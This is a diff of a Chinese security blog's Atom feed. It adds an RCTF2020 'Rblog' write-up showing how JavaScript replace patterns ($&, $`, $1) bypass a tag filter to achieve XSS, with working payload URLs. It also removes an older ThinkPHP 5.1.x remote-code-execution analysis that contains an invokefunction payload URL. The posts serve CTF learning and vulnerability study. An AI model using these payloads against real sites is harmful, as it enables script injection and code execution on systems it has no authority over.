@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://0day.design/"/>
-  <updated>2020-03-20T04:19:25.623Z</updated>
+  <updated>2020-06-01T02:37:23.753Z</updated>
   <id>https://0day.design/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>RCTF2020 Rblog WriteUp</title>
+    <link href="https://0day.design/2020/06/01/RCTF-2020-WriteUp%20copy/"/>
+    <id>https://0day.design/2020/06/01/RCTF-2020-WriteUp copy/</id>
+    <published>2020-06-01T02:00:00.000Z</published>
+    <updated>2020-06-01T02:37:23.753Z</updated>
+    
+    <content type="html"><![CDATA[<hr><a id="more"></a><p>题目是一个用户可以通过传入正则来对选取文章内容进行高亮显示的功能：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197138.jpg" alt="-w1290"></p><p>过正则校验：不能有尖括号且字符不能超过36</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">highlight_word</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    u = <span class="keyword">new</span> URL(location)</span><br><span class="line">    hl = u.searchParams.get(<span class="string">'highlight'</span>) || <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> (hl) &#123;</span><br><span class="line">        <span class="comment">// ban html tags</span></span><br><span class="line">        <span class="keyword">if</span> (hl.includes(<span class="string">'&lt;'</span>) || hl.includes(<span class="string">'&gt;'</span>) || hl.length &gt; <span class="number">36</span>) &#123;</span><br><span class="line">            u.searchParams.delete(<span class="string">'highlight'</span>)</span><br><span class="line">            history.replaceState(<span class="string">''</span>, <span class="string">''</span>, u.href)</span><br><span class="line">            alert(<span class="string">'⚠️ illegal highlight word'</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// why the heck this only highlights the first occurrence? stupid javascript 😠</span></span><br><span class="line">            <span class="comment">// content.innerHTML = content.innerHTML.replace(hl, `&lt;b class="hl"&gt;$&#123;hl&#125;&lt;/b&gt;`)</span></span><br><span class="line">            hl_all = <span class="keyword">new</span> <span class="built_in">RegExp</span>(hl, <span class="string">'g'</span>)</span><br><span class="line">            replacement = <span class="string">`&lt;b class="hl"&gt;<span class="subst">$&#123;hl&#125;</span>&lt;/b&gt;`</span></span><br><span class="line">            post_content.innerHTML = post_content.innerHTML.replace(hl_all, replacement)</span><br><span class="line">            <span class="keyword">let</span> b = <span class="built_in">document</span>.querySelector(<span class="string">'b[class=hl]'</span>)</span><br><span class="line">            <span class="keyword">if</span> (b) &#123;</span><br><span class="line">                <span class="keyword">typeof</span> b.scrollIntoViewIfNeeded === <span class="string">"function"</span> ? b.scrollIntoViewIfNeeded() : b.scrollIntoView()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看文档：<br><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const newStr = str.replace(regexp|substr, newSubstr|function)</span><br></pre></td></tr></table></figure><p><code>str.replace</code>有以下几种特殊模式：<br><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197169.jpg" alt="-w1078"></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197179.jpg" alt="-w1104"></p><p>第一种：用<code>$&amp;</code>引用匹配到的<code>&lt;</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=.|$%26svg/onload=alert(1)+</span><br></pre></td></tr></table></figure></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197188.jpg" alt="-w1060"><br><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197197.jpg" alt="-w960"></p><p>第二种：用$`来获取p标签前边的<code>&lt;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=p|$`svg/onload=alert(1)+</span><br></pre></td></tr></table></figure></p><p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197203.jpg" alt="-w402"></p><p>第三种：<code>$n</code><br>这种就是用的最多的引用匹配，缺点就是需要带括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=(.)|$1svg/onload=alert(1)+</span><br></pre></td></tr></table></figure><p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197211.jpg" alt="-w1040"></p><p>漏洞利用：通过<code>write(unescape(u))</code>来写入当前url来进行任意代码执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=[$`style onload=write(unescape(u)) ]#?highlight=&lt;script&gt;alert(1)&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure></p><p>膜hpdoger!!!</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;hr&gt;
+    
+    </summary>
+    
+      <category term="CTF" scheme="https://0day.design/categories/CTF/"/>
+    
+    
+      <category term="CTF" scheme="https://0day.design/tags/CTF/"/>
+    
+  </entry>
   
   <entry>
     <title>博客上云优化小记</title>
@@ -56,9 +78,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -80,9 +102,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -104,9 +126,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -128,9 +150,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -176,9 +198,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -200,9 +222,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="weblogic" scheme="https://0day.design/tags/weblogic/"/>
     
@@ -226,9 +248,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -250,9 +272,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="fastjson" scheme="https://0day.design/tags/fastjson/"/>
     
@@ -276,9 +298,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="fastjson" scheme="https://0day.design/tags/fastjson/"/>
     
@@ -302,9 +324,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -326,9 +348,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -350,9 +372,9 @@
       <category term="Web" scheme="https://0day.design/categories/Web/"/>
     
     
-      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Java" scheme="https://0day.design/tags/Java/"/>
+    
+      <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -394,9 +416,9 @@
     </summary>
     
     
-      <category term="Web" scheme="https://0day.design/tags/Web/"/>
-    
       <category term="漏洞分析" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Web" scheme="https://0day.design/tags/Web/"/>
     
   </entry>
   
@@ -461,28 +483,6 @@
     
     
       <category term="Crypto" scheme="https://0day.design/tags/Crypto/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ThinkPHP5.1.x 代码执行漏洞分析</title>
-    <link href="https://0day.design/2019/04/15/ThinkPHP5.1.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>https://0day.design/2019/04/15/ThinkPHP5.1.x 代码执行漏洞分析/</id>
-    <published>2019-04-15T08:46:00.000Z</published>
-    <updated>2020-03-19T12:47:56.506Z</updated>
-    
-    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><code>https://tprce/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></p><p><img src="https://static.zybuluo.com/Passer6y/b3x19d6f1pu5yz4crewkthn1/image_1d8ffjpn01kouopob14c9i1mt19.png" alt="image_1d8ffjpn01kouopob14c9i1mt19.png-104.1kB"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从payload入手，在app处下断点跟入, <code>thinkphp/library/think/Request.php</code> 681行，处理兼容模式的url请求：</p><p><img src="https://static.zybuluo.com/Passer6y/sxdjzyjnpeifkhixgpxvs1z3/image_1d8fsee7h1red11t7d9e14omhgk1j.png" alt="image_1d8fsee7h1red11t7d9e14omhgk1j.png-388.5kB"></p><p>在<code>thinkphp/library/think/route/Rule.php</code> 947行<br><img src="https://static.zybuluo.com/Passer6y/o3ro7og9xlqyod0c96jda16v/image_1d8fvv9pa1aadflj4bu2b4pe81m.png" alt="image_1d8fvv9pa1aadflj4bu2b4pe81m.png-276.7kB"><br>可以看到其以<code>/</code>分割，分割成模块/控制器/操作方法</p><p>路由解析，分发到对应模块/控制器/操作方法<code>thinkphp/library/think/route/dispatch/Url.php</code> 37行</p><p><img src="https://static.zybuluo.com/Passer6y/e402mqf4g33n4fwyo4qv5dtp/image_1d8fu10u5a7gujrjgt18171llc9.png" alt="image_1d8fu10u5a7gujrjgt18171llc9.png-345.1kB"></p><p><code>thinkphp/library/think/route/dispatch/Module.php</code>  84行 <code>exec()</code>，实例化控制器<br><img src="https://static.zybuluo.com/Passer6y/v25l3t0ne9lfknxopicxs1jo/image_1d8g15qpv1foi12mihmd1826mvr36.png" alt="image_1d8g15qpv1foi12mihmd1826mvr36.png-294.2kB"></p><p>跟入该文件135行，该函数利用反射机制调用类方法，从而进行代码执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure></p><p>-&gt; <code>thinkphp/library/think/Container.php</code> 347行 <code>invokeFunction()</code>：<br><img src="https://static.zybuluo.com/Passer6y/9neklp8y2cmhalulvogad1bt/image_1d8g1mln71tog1ud81g4l2931d053j.png" alt="image_1d8g1mln71tog1ud81g4l2931d053j.png-387.1kB"></p><p>到这里就已经任意代码执行了。</p><blockquote><p>第一次接触反射机制，记录一下自己的理解，简单来说反射即根据目的地找来源，也就是根据已经实例化的对象来找其所属的类和类中的方法</p></blockquote><p>以上为ThinkPHP5.1.x的rce分析，ThinkPHP5.0.x有一些差异，以后来填坑。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>路由解析过程中没有对控制器的命名规则进行检测，导致我们可以操作任意控制器，官方修复加了正则只允许字符传入：<br><img src="https://static.zybuluo.com/Passer6y/i3q82hu9bdu5rdr6ghl1loxg/image_1d8g2fr8dkjqi9g1aah1unf18dj63.png" alt="image_1d8g2fr8dkjqi9g1aah1unf18dj63.png-173.9kB"></p><p>参考：</p><ol><li><a href="https://www.kancloud.cn/shaoguan/phpstudy/384102" target="_blank" rel="noopener">PHP反射机制原理与用法详解</a></li></ol>]]></content>
-    
-    <summary type="html">
-    
-      &lt;hr&gt;
-    
-    </summary>
-    
-    
-      <category term="Web" scheme="https://0day.design/tags/Web/"/>
-    
-      <category term="代码审计" scheme="https://0day.design/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
